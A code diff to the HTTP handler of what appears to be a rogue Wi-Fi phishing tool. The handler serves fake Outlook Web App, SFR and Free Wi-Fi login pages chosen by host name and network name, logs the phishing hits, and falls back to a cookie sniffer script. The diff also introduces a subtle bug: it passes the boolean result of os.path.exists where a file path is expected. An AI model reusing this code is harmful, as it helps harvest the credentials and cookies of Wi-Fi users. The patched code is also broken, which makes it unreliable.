@@ -333,14 +333,16 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       elif "mail" in path or "mail" in host:
         self.send_response(200)
         self.end_headers()
-        self.wfile.write(open('www/phishing/OutlookWebApp.html','r').read())
+        path = os.path.exists(os.path.join(self.server.www_directory,'phishing/OutlookWebApp.html'))
         logphishing()
+        return self._get_file(path)
 
       elif path == 'indexEncryptingChilli.php':
         self.send_response(200)
         self.end_headers()
-        self.wfile.write(open('www/phishing/sfr.html','r').read())
+        path = os.path.exists(os.path.join(self.server.www_directory,'phishing/sfr.html'))
         logphishing()
+        return self._get_file(path)
       elif path != '' and os.path.exists(os.path.join(self.server.www_directory,path)):
         return self._get_file(path)
       elif user_agent_infos is not None and user_agent_infos.browser.family in ('Chrome Mobile', 'Firefox') and essid in ('SFR WiFi FON', 'SFR WiFi Mobile'):
@@ -352,8 +354,9 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       elif host == 'wifi.free.fr':
         self.send_response(200)
         self.end_headers()
-        self.wfile.write(open('www/phishing/freewifi.html','r').read())
+        path = os.path.exists(os.path.join(self.server.www_directory,'phishing/freewifi.html'))
         logphishing()
+        return self._get_file(path)
       else:
         self.server.app.log("Cookie sniffer for %s"%client.bssid)
         self.send_response(200)
@@ -362,8 +365,8 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         self.send_header('Expires','Sat, 01 Jul 2055 03:42:00 GMT')
         self.send_header('Last-Modified','Tue, 15 Nov 1994 12:30:00 GMT')
         self.end_headers()
-
-        self.wfile.write(open('js/cookie_sniffer.js').read())
+        path = os.path.exists(os.path.join(self.server.www_directory,'phishing/index.html'))
+        self.wfile.write(open(path).read())
 
         faked = False
     except Exception as e:
